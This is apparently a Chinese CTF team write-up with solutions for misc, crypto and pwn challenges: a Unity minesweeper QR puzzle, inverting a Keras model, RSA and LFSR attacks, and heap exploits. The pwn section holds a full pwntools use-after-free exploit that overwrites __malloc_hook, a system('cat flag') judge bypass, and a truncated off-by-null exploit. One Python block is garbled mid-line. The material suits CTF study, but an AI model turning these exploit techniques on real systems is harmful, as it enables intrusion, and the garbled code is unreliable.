## Misc
### Mine Sweeping
勇气、危机、未知、热血、谋略，的3A级游戏大作——扫雷
题目是一个Unity游戏，将其Assembly-CSharp.dll放到dnSpy里，看到其地图分析的逻辑。找到其地图相关的信息。
找到了一个DevilsInHeaven数组，但这个数组并不是按照顺序来的，其中的每一个数据，是从下往上的某一列的数据，1为有雷，0为没有。
然后还找到了Changemap的函数，该函数说明了这个雷的分布也不是完全和前面那个数组一样的，有一些位置（6个）被进行了随机。
这个扫雷雷太多了，所以是不可能正常的扫出来的。
由于ChangeMap改的非常少，所以每次的图其实差别不大。发现了左上左下和右下的大方框和右上的小方框，感觉是向左旋转90度的二维码。
然后一列一列试DevilsInHeaven数组中的数据，找到对应的列
然后整出二维码，扫描二维码得flag
### Deep Encrypt
一道机器学习的题目，给了模型，直接加载模型，看其结构，发现是wx+b=y的线性模型，已知y求x，因为w不是方阵，不能简单通过求逆得到，这里将给定的y作为目标，用梯度下降训练，把wx+b中的w当成输入，x当成参数，训练x直到满足条件
    import h5py
    import numpy as np
    import keras.models as models
    import tensorflow as tf
    def mse(true, predict):
        loss = np.average(np.abs(true - predict))
        return loss
    input_file = np.loadtxt('DeepEncrypt/flag_sample.txt')
    output_file = np.loadtxt('DeepEncrypt/enc_sample.txt')
    model = models.load_model('DeepEncrypt/enc.hdf5')
    model.summary()
    layer1 = model.get_layer(index=1)
    weights = layer1.get_weights()
    W = weights[0]
    b = weights[1]
    print('W:', np.shape(W), 'b:', np.shape(b))
    label = np.loadtxt('DeepEncrypt/flag_enc.txt')
    input_op = tf.placeholder(tf.float32, [128, 64])
    label_op = tf.placeholder(tf.float32, [64])
    W_op = tf.Variable(tf.truncated_normal([1, 128]))
    pred = tf.matmul(tf.sigmoid(W_op), input_op)
    loss = tf.reduce_mean(tf.abs(label_op - pred))
    optimizer = tf.train.AdamOptimizer(learning_rate=1e-3)
    train_op = optimizer.minimize(loss)
    with tf.Session() as sess:
        sess.run(tf.global_variables_initializer())
        for i in range(10000):
            _, loss_value = sess.run([train_op, loss],
                                     feed_dict={input_op: W, label_op:label - b})
            if i % 100 == 0:
                print(i, loss_value)
        result = np.array(sess.run(W_op))
        result[result > 0.5] = 1
        result[result =600/length-1:
               list_i.append(flag_byte)
       list_flag.append(list_i)
    print list_flag
### Baby Rsa
各种方法混搭，用到了低加密指数攻击、低加密指数广播攻击、e与phi(n)不互素时开方、yafu分解两个大小接近的p和q
最后一步解用到的方法：  
结果：  
de1ctf{9b10a98b-71bb-4bdf-a6ff-f319943de21f}
### Baby lfsr
题目给了一个lfsr，隐藏了mask和初始的key，mask和key的长度是256bit；又给出了504位的输出。先爆破8bit，把输出补充到512bit，mask，最后用mask还原出key。爆破的时候检查矩阵的rank和flag的哈希值。
    from sage.all_cmdline import *
    import hashlib
    GF2 = GF(2);
    def pad(m):
        pad_length = 8 - len(m)
        return pad_length*'0' + m
    for x in range(2 ** 8):
        a
        a = a + pad(bin(x)[2:])
        #print a, len(a)
        A = []
        for i in range(512-256):
            A.append([int(op) for op in a[i:i+256]])
        A = matrix(GF2,A)
        #print A.rank()
        if A.rank() != 256:
            continue
        last = a[256:]
        b = [int(op) for op in last]
        b = vector(GF2, b)
        mask = A.solve_right(b)
        sss = ''
        for x in range(256):
            sss += str(mask[x])
        print  sss
        mask = int(sss, 2)
        #mask = 0b0000100101000010111000001101111011101111100010110001001110100000011100101110001111100001011110000111110011000111011100010010001111100111010111011111000100111111010000110001111001000001000110000010110000111011010001111000101000101101010101011010110100000000
        N = 256
        F = GF(2)
        b = a
        R = [vector(F, N) for i in range(N)]
        for i in range(N):
            R[i][N - 1] = mask >> (N-1 - i) & 1
        for i in range(N - 1):
            R[i + 1][i] = 1
        M = Matrix(F, R)
        M = M ** N
        vec = vector(F, N)
        row = 0
        for i in range(N / 8):
            t = int(a[i*8:i*8+8],2)
            for j in xrange(7, -1, -1):
                vec[row] = t >> j & 1
                row += 1
        print 'rank of M:',rank(M)
        if M.rank() != 256:
            continue
        num = int(''.join(map(str, list(M.solve_left(vec)))), 2)
        print num
        KEY = num
        FLAG = "de1ctf{"+hashlib.sha256(hex(KEY)[2:].rstrip('L')).hexdigest()+"}"
        if FLAG[7:11]=='1224':
            print FLAG
            break
## Pwn
### Weapon
没有输出的UAF堆题，通过`stdout`泄漏地址即可，需要爆破一下。
    from pwn import *
    context.log_level = 'debug'
    context.terminal = ['tmux', 'split', '-h']
    def add(p, idx, size, content):
        p.sendlineafter('choice >> ', str(1))
        p.sendlineafter('wlecome input your size of weapon: ', str(size))
        p.sendlineafter('input index: ', str(idx))
        p.sendafter('input your name:', content)
    def delete(p, idx):
        p.sendlineafter('choice >> ', str(2))
        p.sendlineafter('input idx :', str(idx))    
    def edit(p, idx, content):
        p.sendlineafter('choice >> ', str(3))
        p.sendlineafter('input idx: ', str(idx))
        p.sendafter('new content:', content)
    def pwn():
        DEBUG = 0
        if DEBUG == 1:
            p = process('./pwn')
            gdb.attach(p)
        else:
            p = remote('139.180.216.34', 8888)
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        add(p, 0, 0x60, 'sunichi'.ljust(0x58, '\x00') + p64(0x70))
        add(p, 1, 0x60, 'sunichi')
        add(p, 2, 0x60, 'sunichi')
        add(p, 3, 0x60, 'sunichi')
        add(p, 4, 0x60, 'sunichi')
        add(p, 7, 0x60, 'sunichi')
        add(p, 8, 0x60, 'sunichi')
        add(p, 9, 0x60, 'sunichi')
        delete(p, 0)
        delete(p, 2)
        edit(p, 2, '\x60')
        add(p, 2, 0x60, 'sunichi')
        add(p, 5, 0x60, p64(0) + p64(0x70+0x71))
        delete(p, 1)
        edit(p, 5, p64(0) + p64(0x71) + '\xdd\x25')
        delete(p, 0)
        delete(p, 3)
        edit(p, 3, '\x70')
        add(p, 3, 0x60, 'sunichi')
        add(p, 1, 0x60, 'sunichi')
        payload = '\x00\x00\x00' + 6 * p64(0) + p64(0xfbad1800) + p64(0) * 3 + '\x00'
        add(p, 6, 0x60, payload)
        p.recvuntil(p64(0xfbad1800) + p64(0) * 3)
        recv = p.recv(8)
        libc.address = u64(recv) - (0x00007ffff7dd2600 - 0x00007ffff7a0d000)
        delete(p, 8)
        edit(p, 8, p64(libc.symbols['__malloc_hook'] - 0x13))
        add(p, 8, 0x60, 'sunichi')
        add(p, 8, 0x60, '\x00\x00\x00' + p64(libc.address + 0xf02a4))
        delete(p, 9)
        delete(p, 9)
        print hex(libc.address)
        p.interactive()
        p.close()
    if __name__ == '__main__':
        pwn()
### A+B Judge
非预期解
    #include 
    void main(void) {
        system("cat flag");
        return;
    }
### Mimic Note
off-by-null，32位和64位p64和p32的情况刚好不一致，可以利用不同`idx`的堆块在两边分别unlink。然后同时修改两个程序（核心步骤）的`atoi@got`到gadget处进行ROP并劫持`write@got`到`syscall`。
    from pwn import *
    #context.log_level = 'debug'
    context.terminal = ['tmux', 'split', '-h']
    def add(p, size):
        p.sendlineafter('>> ', str(1))
        p.sendlineafter('size?\n', str(size))
    def delete(p, idx):
        p.sendlineafter('>> ', str(2))
        p.sendlineafter('index ?\n', str(idx))
    def show(p, idx):
        p.sendlineafter('>> ', str(3))
        p.sendlineafter('index ?\n', str(idx))
    def edit(p, idx, content):
        p.sendlineafter('>> ', str(4))
        p.sendlineafter('index ?\n', str(idx))
        p.sendafter('content?\n', content)
        #sleep(0.5)
    def pwn(count):
        DEBUG = 0
        arch = ''
        elf32 = ELF('./mimic_note_32')
        elf64 = ELF('./mimic_note_64')
        #if DEBUG == 1 and arch == '64':
        #    p = process('./mimic_note_64')
        #elif DEBUG == 1 and arch == '32':
        #    p = process('./mimic_note_32')
        if DEBUG == 1: